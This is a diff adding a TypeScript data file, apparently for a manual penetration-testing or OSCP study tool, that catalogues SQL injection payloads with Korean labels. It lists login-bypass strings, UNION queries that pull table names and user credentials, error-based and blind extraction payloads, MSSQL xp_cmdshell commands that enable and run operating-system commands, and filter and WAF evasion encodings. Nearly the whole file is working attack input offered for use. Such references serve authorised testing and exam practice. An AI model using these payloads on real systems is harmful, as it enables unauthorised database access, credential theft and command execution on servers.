@@ -1,0 +1,123 @@
+// SQLmap and other automated SQLi tools are explicitly banned on the OSCP
+// exam ("SQLi and all exploitation must be done manually" — OffSec Exam
+// Guide). This is a copy-only reference for manually testing a request —
+// nothing here sends a request or picks a payload automatically; the user
+// still has to paste it into the request editor and press Send themselves.
+export type SqlPayload = { label: string; payload: string; note?: string };
+export type SqlPayloadCategory = {
+  id: string;
+  title: string;
+  engines: string[];
+  description: string;
+  payloads: SqlPayload[];
+};
+
+export const sqlPayloadCategories: SqlPayloadCategory[] = [
+  {
+    id: "auth-bypass",
+    title: "인증 우회",
+    engines: ["generic"],
+    description: "로그인 폼의 username/password 필드에서 조건을 항상 참으로 만듭니다.",
+    payloads: [
+      { label: "OR 조건 (주석)", payload: "' OR '1'='1'-- -" },
+      { label: "OR 조건 (해시 주석, MySQL)", payload: "' OR '1'='1'#" },
+      { label: "관리자 계정 지정", payload: "admin'-- -" },
+      { label: "UNION 기반 로그인", payload: "' UNION SELECT 1,'admin','x'-- -",
+        note: "컬럼 수·타입을 먼저 UNION 카테고리로 확인한 뒤 맞추세요." },
+    ],
+  },
+  {
+    id: "union",
+    title: "UNION 기반 추출",
+    engines: ["mysql", "mssql", "postgresql", "oracle"],
+    description: "컬럼 수를 먼저 확인한 뒤, 문자열이 들어가는 컬럼을 찾아 데이터를 추출합니다.",
+    payloads: [
+      { label: "컬럼 수 탐색 (ORDER BY)", payload: "' ORDER BY 1-- -",
+        note: "숫자를 늘려가며 에러가 나는 지점 직전이 컬럼 수." },
+      { label: "컬럼 수 탐색 (UNION NULL)", payload: "' UNION SELECT NULL,NULL,NULL-- -",
+        note: "NULL 개수를 컬럼 수에 맞춰 조절." },
+      { label: "문자열 컬럼 확인", payload: "' UNION SELECT 'a','b','c'-- -" },
+      { label: "DB 버전 (MySQL/PostgreSQL)", payload: "' UNION SELECT @@version,NULL,NULL-- -" },
+      { label: "DB 버전 (MSSQL)", payload: "' UNION SELECT @@version,NULL,NULL--" },
+      { label: "DB 버전 (Oracle)", payload: "' UNION SELECT banner,NULL,NULL FROM v$version--" },
+      { label: "테이블 목록 (MySQL)",
+        payload: "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -" },
+      { label: "컬럼 목록 (MySQL, 테이블 지정)",
+        payload: "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns " +
+          "WHERE table_name='users'-- -" },
+      { label: "자격증명 추출 예시",
+        payload: "' UNION SELECT username,password,NULL FROM users-- -" },
+    ],
+  },
+  {
+    id: "error-based",
+    title: "에러 기반 추출",
+    engines: ["mysql", "mssql", "postgresql"],
+    description: "쿼리 에러 메시지에 데이터를 실어 응답으로 유출시킵니다. UNION 컬럼 수를 몰라도 됩니다.",
+    payloads: [
+      { label: "MySQL extractvalue", payload: "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -" },
+      { label: "MySQL updatexml", payload: "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -" },
+      { label: "MSSQL CONVERT 에러", payload: "' AND 1=CONVERT(int,(SELECT @@version))--" },
+      { label: "PostgreSQL CAST 에러", payload: "' AND 1=CAST((SELECT version()) AS int)-- -" },
+    ],
+  },
+  {
+    id: "boolean-blind",
+    title: "불리언 기반 Blind",
+    engines: ["mysql", "mssql", "postgresql"],
+    description: "응답 내용(참/거짓에 따라 페이지가 달라짐)만으로 데이터를 한 글자씩 유추합니다.",
+    payloads: [
+      { label: "참/거짓 기준 확인", payload: "' AND 1=1-- -" },
+      { label: "거짓 비교 (기준과 대조)", payload: "' AND 1=2-- -" },
+      { label: "길이 확인", payload: "' AND (SELECT LENGTH(database()))>5-- -" },
+      { label: "문자 하나씩 비교 (MySQL)",
+        payload: "' AND (SELECT SUBSTRING(database(),1,1))='a'-- -" },
+      { label: "문자 하나씩 비교 (MSSQL)",
+        payload: "' AND SUBSTRING((SELECT DB_NAME()),1,1)='a'--" },
+    ],
+  },
+  {
+    id: "time-blind",
+    title: "시간 기반 Blind",
+    engines: ["mysql", "mssql", "postgresql", "oracle"],
+    description: "응답이 없거나 애매할 때, 응답 지연 여부로만 참/거짓을 판단합니다. 지연 시간은 짧게 유지하세요.",
+    payloads: [
+      { label: "MySQL SLEEP", payload: "' AND SLEEP(5)-- -" },
+      { label: "MySQL 조건부 SLEEP", payload: "' AND IF(1=1,SLEEP(5),0)-- -" },
+      { label: "MSSQL WAITFOR", payload: "'; WAITFOR DELAY '0:0:5'--" },
+      { label: "PostgreSQL pg_sleep", payload: "' AND (SELECT pg_sleep(5))-- -" },
+      { label: "Oracle DBMS_LOCK", payload: "' AND (SELECT CASE WHEN (1=1) THEN " +
+        "dbms_lock.sleep(5) ELSE NULL END FROM dual)-- -" },
+    ],
+  },
+  {
+    id: "mssql-xp-cmdshell",
+    title: "MSSQL xp_cmdshell",
+    engines: ["mssql"],
+    description: "sa/sysadmin 권한 계정에서만 동작합니다. 활성화 자체가 침해적이니 범위와 위험을 검토한 뒤 실행하세요.",
+    payloads: [
+      { label: "고급 옵션 노출", payload: "EXEC sp_configure 'show advanced options',1; RECONFIGURE;" },
+      { label: "xp_cmdshell 활성화", payload: "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;" },
+      { label: "명령 실행", payload: "EXEC xp_cmdshell 'whoami';" },
+      { label: "UNION으로 결과 유출",
+        payload: "'; EXEC xp_cmdshell 'whoami'-- -",
+        note: "결과가 응답에 안 보이면 stacked query 지원 여부와 out-of-band 방법을 검토." },
+    ],
+  },
+  {
+    id: "waf-bypass",
+    title: "필터·WAF 우회",
+    engines: ["generic"],
+    description: "공백·키워드 필터링을 우회할 때 시도할 대체 표현들입니다.",
+    payloads: [
+      { label: "공백 대신 주석", payload: "'/**/OR/**/'1'='1" },
+      { label: "공백 대신 개행/탭", payload: "'%0aOR%0a'1'='1" },
+      { label: "대소문자 혼합", payload: "' oR '1'='1" },
+      { label: "이중 인코딩 따옴표", payload: "%2527 OR %25271%2527=%25271" },
+      { label: "주석으로 키워드 분리 (MySQL)", payload: "UN/**/ION SEL/**/ECT" },
+    ],
+  },
+];
+
+export const findSqlPayloadCategory = (id: string) =>
+  sqlPayloadCategories.find((category) => category.id === id);
